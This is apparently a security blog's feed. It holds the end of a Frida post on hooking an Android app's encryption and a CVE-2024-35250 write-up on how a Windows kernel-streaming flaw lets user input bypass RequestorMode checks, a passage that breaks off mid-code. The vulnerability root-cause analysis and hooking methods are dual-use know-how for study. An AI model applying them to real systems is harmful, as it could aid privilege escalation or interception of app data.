script</span>):</span><br><span class="line">    <span class="keyword">if</span> script.startswith(<span class="string">&quot;📦\n&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> script</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;Script.evaluate(<span class="subst">&#123;json.dumps(name)&#125;</span>, <span class="subst">&#123;json.dumps(script)&#125;</span>);&quot;</span></span><br></pre></td></tr></table></figure><p>将Js代码包装成frida能识别的格式。<code>Script.evaluate()</code>是Frida内部用来执行脚本的方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">build_final_script</span><span class="params">(raw_fragments)</span>:</span><br><span class="line">    fragments = []</span><br><span class="line">    next_script_id = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> raw_fragment in raw_fragments:</span><br><span class="line">        <span class="keyword">if</span> raw_fragment.startswith(<span class="string">&quot;📦\n&quot;</span>):</span><br><span class="line">            fragments.append(raw_fragment[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script_id = next_script_id</span><br><span class="line">            next_script_id += <span class="number">1</span></span><br><span class="line">            size = len(raw_fragment.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">            fragments.append(f<span class="string">&quot;&#123;size&#125; /frida/repl-&#123;script_id&#125;.js\n✄\n&#123;raw_fragment&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;📦\n&quot;</span> + <span class="string">&quot;\n✄\n&quot;</span>.join(fragments)</span><br></pre></td></tr></table></figure><p>将多个JavaScript片段（Java桥接器 + 你的代码）组合成一个完整的Frida脚本包。📦和✄是Frida的内部标记符。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_java_bridge</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;查找Java桥接器文件&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> path <span class="keyword">in</span> <span class="built_in">reversed</span>(sys.path):</span><br><span class="line">        <span class="keyword">if</span> path.endswith(<span class="string">&#x27;site-packages&#x27;</span>):</span><br><span class="line">            bridge_path = os.path.join(path, <span class="string">&#x27;frida_tools&#x27;</span>, <span class="string">&#x27;bridges&#x27;</span>, <span class="string">&#x27;java.js&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> os.path.exists(bridge_path):</span><br><span class="line">                <span class="keyword">return</span> bridge_path</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果找不到，尝试其他可能的路径</span></span><br><span class="line">    <span class="keyword">import</span> frida_tools</span><br><span class="line">    frida_tools_path = os.path.dirname(frida_tools.__file__)</span><br><span class="line">    bridge_path = os.path.join(frida_tools_path, <span class="string">&#x27;bridges&#x27;</span>, <span class="string">&#x27;java.js&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(bridge_path):</span><br><span class="line">        <span class="keyword">return</span> bridge_path</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">raise</span> FileNotFoundError(<span class="string">&quot;找不到Java桥接器文件，请确保frida-tools已正确安装&quot;</span>)</span><br></pre></td></tr></table></figure><p>自动查找系统中安装的Java桥接器文件。这个文件包含了让<code>Java.perform()</code>工作所需的所有代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建完整的脚本</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 读取Java桥接器</span></span><br><span class="line">    bridge_path = find_java_bridge()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(bridge_path, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        java_bridge = f.read()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 添加Java到全局对象</span></span><br><span class="line">    java_bridge += <span class="string">&quot;\n\nObject.defineProperty(globalThis, &#x27;Java&#x27;, &#123; value: bridge &#125;);&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 包装用户脚本</span></span><br><span class="line">    wrapped_script = wrap_user_script(<span class="string">&quot;hookTest&quot;</span>, user_js_code)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 构建最终脚本</span></span><br><span class="line">    raw_fragments = [java_bridge, wrapped_script]</span><br><span class="line">    final_script = build_final_script(raw_fragments)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;脚本构建成功&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;脚本构建失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ol><li>读取Java桥接器: 从<code>frida_tools/bridges/java.js</code>读取Java桥接器代码</li><li>注册Java对象: 添加<code>Object.defineProperty(globalThis, &#39;Java&#39;, &#123; value: bridge &#125;);</code>，这行代码让Java对象在全局可用</li><li>包装你的脚本: 将你的<code>JavaScript</code>代码包装成<code>Frida</code>格式</li><li>组合脚本: 将<code>Java</code>桥接器和你的代码组合成最终脚本</li></ol><p><a href="http://127.0.0.1:8000/get_data?item_id=1&item_user=12345678901&item_pass=123456789">http://127.0.0.1:8000/get_data?item_id=1&amp;item_user=12345678901&amp;item_pass=123456789</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;item_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;item_retval&quot;</span><span class="punctuation">:</span><span class="string">&quot;NIszaqFPos1vd0pFqKlB42Np5itPxaNH//FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT/FXC+BMD\nbmIP0xrIL98xsKTOSbgIWuEhruHgPtMk8UaM2X3bIN17yS34xTmxUQlfDaRFr4d1eIV2+Kn2vl2z\n8dbq+kB0AY2H+3lKAmUDzuRngtxIqaZHS9MIBv9sErGLqpABUb9MgTOmjljk+33RaMn5gSx6PQKy\nQN2xZw4=\n&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>抓包结果：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;Encrypt&quot;</span><span class="punctuation">:</span><span class="string">&quot;NIszaqFPos1vd0pFqKlB42Np5itPxaNH\/\/FDsRnlBfgL4lcVxjXii02ggCULFNaeuVKT\/FXC+BMD\nbmIP0xrIL98xsKTOSbgIWuEhruHgPtMk8UaM2X3bIN17yS34xTmxUQlfDaRFr4d1eIV2+Kn2vl2z\n8dbq+kB0AY2H+3lKAmUDzuRngtxIqaZHS9MIBv9sErGLqpABUb9MgTOmjljk+33RaMn5gSx6PQKy\nQN2xZw4=\n&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>结果相等~~~</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;只做学习记录的备份，来自于&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.kanxue.com/thread-273293.htm</summary>
      
    
    
    
    <category term="安卓逆向" scheme="http://s1nec-1o.github.io/categories/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91/"/>
    
    
    <category term="android" scheme="http://s1nec-1o.github.io/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2024-35250复现</title>
    <link href="http://s1nec-1o.github.io/2025/09/05/CVE-2024-35250%E5%A4%8D%E7%8E%B0/"/>
    <id>http://s1nec-1o.github.io/2025/09/05/CVE-2024-35250%E5%A4%8D%E7%8E%B0/</id>
    <published>2025-09-05T13:13:44.000Z</published>
    <updated>2025-09-05T13:20:02.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2024-35250分析"><a href="#CVE-2024-35250分析" class="headerlink" title="CVE-2024-35250分析"></a>CVE-2024-35250分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>原文链接：<a href="https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/">https://devco.re/blog/2024/08/23/streaming-vulnerabilities-from-windows-kernel-proxying-to-kernel-part1/</a></p><p>本篇文章只做学习记录，对一些不理解的概念进行了补充</p><h2 id="Kernel-Streaming简单介绍"><a href="#Kernel-Streaming简单介绍" class="headerlink" title="Kernel Streaming简单介绍"></a>Kernel Streaming简单介绍</h2><p><em>Kernel Streaming</em>（KS） 是指 Microsoft 提供的服务，这些服务支持流式处理数据的内核模式处理。</p><p>Kernel Streaming 中，提供了三种多媒体驱动模型：<em>port class</em>、<em>AVStream</em> 和 <em>stream class</em>。</p><p>这些类驱动程序在系统文件 <em>portcls.sys</em>、<em>stream.sys</em> 和 <em>ks.sys</em> （也称为 <em>AVStream</em>） 中作为导出驱动程序 （内核模式 DLL） 实现。</p><p>大多数用于PCI 和DMA 型音效装置的硬体驱动程式，它处理与音讯相关的数据传输，例如音量控制、麦克风输入等等，主要会使用到的元件函式库会是portcls.sys。</p><p>主要介绍port class 和AVStream</p><h3 id="Port-Class"><a href="#Port-Class" class="headerlink" title="Port Class"></a>Port Class</h3><p>由微软提供端口驱动（Port Driver），处理通用音频功能（如混音、格式转换）。硬件厂商只需实现微型端口驱动（Miniport Driver），专注于硬件控制。</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116852.png" alt="image-20250902200915023" style="zoom:50%;" /><h3 id="AVStream"><a href="#AVStream" class="headerlink" title="AVStream"></a>AVStream</h3><p>适用于视频采集、流媒体处理（如摄像头、视频捕获卡）</p><p>取代了旧版 <strong>KS（Kernel Streaming）</strong> 框架，提供更现代的驱动模型。</p><p>支持即插即用（PnP）、电源管理，简化了过滤器（Filter）和管脚（Pin）的实现。</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116854.png" alt="image-20250902201053716" style="zoom:50%;" /><h2 id="设备交互"><a href="#设备交互" class="headerlink" title="设备交互"></a>设备交互</h2><p>在我们想要与音频设备和视讯镜头等设备交互时，我们可以通过CreateFile函数开启一个设备，那么这类型的设备，不会像是<code>\Devcie\NamedPipe</code>这类型的名称，而是会像下面这样的路径:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\\?\hdaudio#subfunc_01&amp;ven_8086&amp;dev_2812&amp;nid_0001&amp;subsys_00000000&amp;rev_1000#<span class="number">6</span>&amp;<span class="number">2f</span>1f346a&amp;<span class="number">0</span>&amp;<span class="number">0002</span>&amp;<span class="number">0000001</span>d#&#123;<span class="number">6994</span>ad04<span class="number">-93</span>ef<span class="number">-11</span>d0-a3cc<span class="number">-00</span>a0c9223196&#125;\ehdmiouttopo</span><br></pre></td></tr></table></figure><ol><li><p>路径前缀<code>\\?\</code></p><ul><li>Windows 中一个特殊的路径前缀，用于指示系统将后面的路径视为一个“原始设备路径”或“长路径”。它<strong>绕过了通常的路径解析限制</strong>（例如，260个字符的MAX_PATH限制）和某些文件系统解析规则。</li></ul></li><li><p>设备类型标识</p><p><code>hdaudio</code>：表示设备为 <strong>高清音频控制器</strong>（如 Intel HD Audio）</p><p>类似还有：</p><ul><li><code>usb#vid_xxxx&amp;pid_xxxx</code>（USB 摄像头）</li><li><code>pci#ven_xxxx&amp;dev_xxxx</code>（PCI 视频采集卡）</li></ul></li><li><p>subfunc_01代表一个特殊的功能</p></li><li><p>硬件标识符</p><p><code>ven_8086</code>：厂商 ID</p><p><code>dev_2812</code>：设备型号</p><p><code>nid_0001</code>：节点 ID</p></li><li><p>GUID 部分</p><p><code>&#123;6994ad04-93ef-11d0-a3cc-00a0c9223196&#125;</code>：Windows 定义的设备接口类 GUID（此处是 <strong>KSCATEGORY_AUDIO</strong>，表示音频设备）</p><p>其他常见 GUID：</p><ul><li>摄像头：<code>&#123;65E8773D-8F56-11D0-A3B9-00A0C9223196&#125;</code></li><li>视频采集：<code>&#123;53172480-4791-11D0-A5D6-28DB04C10000&#125;</code></li></ul></li><li><p>功能端点</p><p><code>ehdmiouttopo</code>：表示设备的特定功能端点（此处是 <em>HDMI</em> 音频输出拓扑）</p></li></ol><h2 id="枚举设备（Enumerate-device）"><a href="#枚举设备（Enumerate-device）" class="headerlink" title="枚举设备（Enumerate device）"></a>枚举设备（Enumerate device）</h2><p>由于硬件配置、厂商 ID、设备实例 ID 等差异，音频&#x2F;视频设备的路径（如 <code>\\?\hdaudio#...</code>）是动态生成的，<strong>不能硬编码</strong>在代码中</p><p>要使用 Windows 提供的设备管理 API（如 <code>SetupDi*</code> 系列函数）动态获取设备路径</p><p><code>SetupDi*</code>系列核心api</p><ol><li><p>**<code>SetupDiGetClassDevs</code>**获取指定设备类别（如音频、摄像头）的所有设备列表。</p><p>参数：</p><ul><li><code>ClassGuid</code>：设备类别的 GUID（如 <code>KSCATEGORY_AUDIO</code>）。</li><li><code>Flags</code>：控制枚举范围（如 <code>DIGCF_PRESENT</code> 只枚举当前连接的设备）。</li></ul></li><li><p>**<code>SetupDiEnumDeviceInterfaces</code>**遍历设备列表，获取每个设备的接口信息（包括设备路径）。</p></li><li><p>**<code>SetupDiGetDeviceInterfaceDetail</code>**获取设备的详细路径（即 <code>\\?\hdaudio#...</code> 格式的字符串）。</p></li></ol><p>也可以使用KS 所提供的<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ksproxy/nf-ksproxy-ksopendefaultdevice">KsOpenDefaultDevice</a>获得指定PnP类别的第一个设备的Handle，实际上来说也只是<code>SetupDiGetClassDevs</code> 和<code>CreateFile</code> 的封装而已。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">KSDDKAPI HRESULT <span class="title">KsOpenDefaultDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  REFGUID     Category, <span class="comment">// PnP的类别标签</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in]  ACCESS_MASK Access,   <span class="comment">// 指定如何访问默认设备的 ACCESS_MASK 位掩码</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [out] PHANDLE     DeviceHandle <span class="comment">//指向接收所打开的默认设备的句柄的变量的指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Ks.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;KsMedia.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HANDLE g_hDevice;</span><br><span class="line">HRESULT hr = <span class="built_in">KsOpenDefaultDevice</span>(</span><br><span class="line">    KSCATEGORY_VIDEO_CAMERA,</span><br><span class="line">    GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">    &amp;g_hDevice</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h2 id="内核流对象（Kernel-Streaming-object）"><a href="#内核流对象（Kernel-Streaming-object）" class="headerlink" title="内核流对象（Kernel Streaming object）"></a>内核流对象（Kernel Streaming object）</h2><p><em>Kernel Streaming</em> 会在Kernel 中建立一些相关的Instance（实例），其中最为重要的就是<em>KS Filters</em>及<em>KS Pins</em>。</p><h3 id="KS-filters"><a href="#KS-filters" class="headerlink" title="KS filters"></a>KS filters</h3><p>每个KS过滤器通常代表一个物理设备或设备的特定功能模(不仅限于物理设备，也可以用于虚拟设备或软件层面的处理), 作为数据处理的中心枢纽，所有流数据都要通过过滤器进行处理</p><blockquote><p>例如: 打开音频设备后会对应到一个音频过滤器，过滤器可能由多个节点组成，节点对流数据进行处理。音频过滤器通常会处理音频数据流，但它可能包含多个子功能（如<strong>解码、编码、效果处理</strong>等）</p></blockquote><p>概念上如下图所示，中间的大框表示一个代表音讯设备的KS filter。而我们想要从音讯设备中读取资料时，会从左边读入Filter，经过几个节点进行处理后，从右边输出。</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116855.png" alt="image-20250902213806097" style="zoom:50%;" /><h3 id="KS-pins"><a href="#KS-pins" class="headerlink" title="KS pins"></a>KS pins</h3><p>作为过滤器的数据输入&#x2F;输出端点, 必须通过Pin实例才能对Filter进行数据读写操作</p><p>主要作用有: 明确区分输入端和输出端, 定义支持的数据格式和传输特性, 控制数据流的方向和行为</p><h2 id="KS-Property（属性管理系统）"><a href="#KS-Property（属性管理系统）" class="headerlink" title="KS Property（属性管理系统）"></a>KS Property（属性管理系统）</h2><p>每个KS Object都有自己的KS Property，每个Property都会有相对应的功能，前面所提到的Pin 中的数据格式、音量大小及设备的状态等等，通常会对应到一组GUID，我们可以透过<em>IOCTL_KS_PROPERTY</em>来读取或设定这些Property</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>例如应用程序从视频摄像头读取数据的流程大致如下图</p><p>其最简单的流程大概如这张图所示 :</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116856.png" alt="image-20250902214613487" style="zoom:50%;" /><ol><li>开启设备后获得设备Handle</li><li>使用这个Handle 在这个Filter 上建立Pin 的Instance 并获得Pin handle</li><li>使用IOCTL_KS_PROPERTY 设置Pin 的状态到RUN</li><li>最后就可以使用 <em>IOCTL_KS_READ_STREAM</em> 从这个Pin 中读资料进来</li></ol><h2 id="内核流式传输架构-Kernel-Streaming-architecture"><a href="#内核流式传输架构-Kernel-Streaming-architecture" class="headerlink" title="内核流式传输架构 (Kernel Streaming architecture)"></a>内核流式传输架构 (Kernel Streaming architecture)</h2><p>整个内核流式传输架构大致如下图</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116857.png" alt="image-20250902215335970" style="zoom: 50%;" /><p>在Kernel Stearming 元件中，最为核心的就是ksthunk.sys 及ks.sys，几乎所有功能都会与它们有关。</p><h3 id="ksthunk"><a href="#ksthunk" class="headerlink" title="ksthunk"></a>ksthunk</h3><p><strong>内核流式 WOW Thunk 服务驱动程序</strong></p><p>在调用 DeviceIoControl 应用后，在 Kernel Streaming 的入口点 ，但它功能很简单，负责将 WoW64 进程中的 32 位请求转换成 64 位请求，使得下层的驱动就不必为 32 位结构另外处理。</p><blockquote><p><code>ksthunk.sys</code> 是一个专门为多媒体（Kernel Streaming）设计的“翻译层”驱动。它作为中间人，将来自老旧32位应用程序的请求转换为现代64位驱动能够理解的格式，从而实现了完美的向后兼容性</p></blockquote><h3 id="ks"><a href="#ks" class="headerlink" title="ks"></a>ks</h3><p>内核连接和流架构库</p><p>内核流媒体的核心组件之一，它是内核流媒体的库函数，负责转发 <em>IOCTL_KS_PROPERTY</em> 等请求到对应设备的驱动程序中，同时也会负责处理 <em>AVStream</em> 的相关功能。</p><h3 id="IOCTL-KS-的工作流程"><a href="#IOCTL-KS-的工作流程" class="headerlink" title="IOCTL_KS_* 的工作流程"></a>IOCTL_KS_* 的工作流程</h3><p>当调用DeviceIoControl时，就会像下图一样，将使用者的request按照顺序发给相应的driver处理</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116858.png" alt="image-20250903105703365" style="zoom:50%;" /><p>而到第 6 步时 ks.sys 就会根据你 requests 的 <em>Property</em> 来決定要交给哪个 driver 及 handler 來处理你的 request。</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116859.png" alt="image-20250903105826847" style="zoom:50%;" /><p>最终再转发给相应的driver(驱动程序)，如上图最后转发给 portcls 中的 handler 来操作音频设备</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="PreviousMode"><a href="#PreviousMode" class="headerlink" title="PreviousMode"></a>PreviousMode</h3><p>其有两种可能**<code>UserMode(0)</code><strong>和</strong><code>KernelMode(1)</code>**, 该值会影响内核是否启用某些操作来保障安全性</p><table><thead><tr><th align="left">调用方式</th><th align="left">PreviousMode 设置</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">用户模式应用调用 <code>NtXxx</code></td><td align="left">自动设为 <code>UserMode</code></td><td align="left">系统调用陷阱处理程序（如 <code>syscall</code> &#x2F; <code>sysenter</code>）会设置 <code>PreviousMode = UserMode</code>。</td></tr><tr><td align="left">内核驱动调用<code>NtXxx</code></td><td align="left">保持调用线程的原有值</td><td align="left">如果线程原本是用户模式调用链的一部分，<code>PreviousMode</code> 可能仍是 <code>UserMode</code>，导致错误。</td></tr><tr><td align="left">内核驱动调用 <code>ZwXxx</code></td><td align="left">强制设为 <code>KernelMode</code></td><td align="left"><code>ZwXxx</code> 是 <code>NtXxx</code> 的包装器，会临时覆盖 <code>PreviousMode</code> 为 <code>KernelMode</code>，避免安全检查。</td></tr></tbody></table><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116860.png" alt="image-20250903114412750" style="zoom:50%;" /><h3 id="RequestorMode"><a href="#RequestorMode" class="headerlink" title="RequestorMode"></a>RequestorMode</h3><p>另外一个类似的则是 IRP 中的 RequestorMode 这边就是记录你原始的 requests 是来自 UserMode 还是 KernelMode，在 Kernel driver 中的代码是非常常用到的字段，通常会来自 PreviousMode。</p><p>在内核驱动中，常常会用到这个字段决定是否需要对用户的requests做一些额外的安全检查</p><p>即如果用户态发送IRP请求进入内核态后调用了<code>Zw*</code>函数, 而<code>Zw\*</code>函数本身又发起了一个IRP请求</p><p>此时PreviousMode已经变为KernelMode, 但是后来发起的IRP请求却依然可能包含有用户传递的内容, 从而使用户的请求规避了某些安全检查</p><p>事实上确实出现了这种问题：</p><blockquote><p>如果调用方提供了<em><strong>InputBuffer</strong></em>或<em><strong>OutputBuffer</strong></em>参数，该参数必须指向驻留在系统内存中的缓冲区。调用方需负责验证从用户模式缓冲区复制到输入缓冲区的所有参数值。输入缓冲区可能包含根据请求发起者是用户模式应用程序还是内核模式驱动程序而不同解释的参数值。在<strong>IoBuildDeviceIoControlRequest</strong>返回的IRP中，<strong>RequestorMode</strong>字段始终设置为<strong>KernelMode</strong>。该值表明请求及请求中包含的任何信息均来自可信的内核模式组件。</p></blockquote><p>也就是默认情况下，使用 <em><strong>IoBuildDeviceIoControlRequest</strong></em> 这个方法去创建一个 DeviceIoControl 的 IRP 时，如果你没有特别去设置 RequestorMode 就会直接以 KernelMode 形式去呼叫 IOCTL。</p><blockquote><p>这个 API 主要是 Kernel driver 用来呼叫 IOCTL 的其中一种方法</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">KsSynchronousIoControlDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        PFILE_OBJECT FileObject,</span></span></span><br><span class="line"><span class="params"><span class="function">        KPROCESSOR_MODE RequestorMode,</span></span></span><br><span class="line"><span class="params"><span class="function">        ULONG IoControl,</span></span></span><br><span class="line"><span class="params"><span class="function">        PVOID InBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">        ULONG InSize,</span></span></span><br><span class="line"><span class="params"><span class="function">        PVOID OutBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">        ULONG OutSize,</span></span></span><br><span class="line"><span class="params"><span class="function">        PULONG BytesReturned)</span></span></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116861.png" alt="image-20250903203907174" style="zoom:50%;" /><p>在<em>ks!KsSynchronousIoControlDevice</em>函数中，先调用了<em>IoBuildDeviceIoControlRequest</em>，然后根据参数设置Irp-&gt;RequestorMode，且会根据 <em>KsSynchronousIoControlDevice</em> 参数不同而去设置不同的数值</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116862.png" alt="image-20250903204146415" style="zoom:50%;" /><p>然而几乎所有调用 <em>ks!KsSynchronousIoControlDevice</em> 函数的地方，第二个参数总是设置为KernelMode（0），这就导致了可能存在的安全问题</p><p>因此我们将 Kernel Streaming 中的 <em>bug pattern</em> 转换成下列几点：</p><ol><li>有使用 <em>KsSynchronousIoControlDevice</em></li><li>有可控的<ul><li>输入缓冲区</li><li>输出缓冲区</li></ul></li><li>第二次处理 IOCTL 的地方有依赖 RequestorMode 做安全检查，并且有可以作为提权利用的地方。 （这个条件说明在原本第二次处理 IOCTL 的时候，如果不做检查，就会有可能的安全问题）</li></ol><p>可以发现，在<em>ks!SerializePropertySet</em>和<em>ks!UnserializePropertySet</em>中都有：(22H2)</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116863.png" alt="image-20250903205141638" style="zoom: 50%;" /><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202509052116864.png" alt="image-20250903213750850" style="zoom:50%;" /></p><p>在 Kernel Streaming 的 <code>IOCTL_KS_PROPERTY</code> 功能中，为了提高效率</p><p>提供了 <code>KSPROPERTY_TYPE_SERIALIZESET</code> 和 <code>KSPROPERTY_TYPE_UNSERIALIZESET</code> 功能允许用户通过 <strong>单次调用</strong> 与多个 Property 进行操作。</p><p>当我们用这功能时，这些 requests 将被 <em>KsPropertyHandler</em> 函数分解成多个呼叫</p><blockquote><p><em>KSPROPERTY_TYPE_SERIALIZESET</em> 和 <em>KSPROPERTY_TYPE_UNSERIALIZESET</em> 请求允许通过客户端的一次调用与多个属性进行交互。如果内核流式处理程序用于处理属性请求，则这些请求将由 <a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/ks/nf-ks-kspropertyhandler"><strong>KsPropertyHandler</strong></a> 函数分解为多个调用。使用此处理程序时，属性集定义控制要序列化哪些属性。</p></blockquote><p>根据文章，我们可以定位到<em>ks!KsPropertyHandler</em> -&gt;<em>ks!UnserializePropertySet</em>的漏洞调用链，让我们分析一下</p><h3 id="ks-UnserializePropertySet"><a href="#ks-UnserializePropertySet" class="headerlink" title="ks!UnserializePropertySet"></a>ks!UnserializePropertySet</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">   .........;</span><br><span class="line">v5 = *(_QWORD *)(a1 + <span class="number">24</span>);</span><br><span class="line">v6 = *(_QWORD *)(a1 + <span class="number">184</span>);</span><br><span class="line">.........;</span><br><span class="line">v10 = (<span class="type">char</span> *)(v5 + <span class="number">20</span>);</span><br><span class="line">.........;</span><br><span class="line">   OutBuffer = v10 + <span class="number">32</span>;</span><br><span class="line">.........;</span><br><span class="line"><span class="built_in">memmove</span>(PoolWithTag, *(<span class="type">const</span> <span class="type">void</span> **)(v6 + <span class="number">0x20</span>), InSize); <span class="comment">//[1]</span></span><br><span class="line">   PoolWithTag[<span 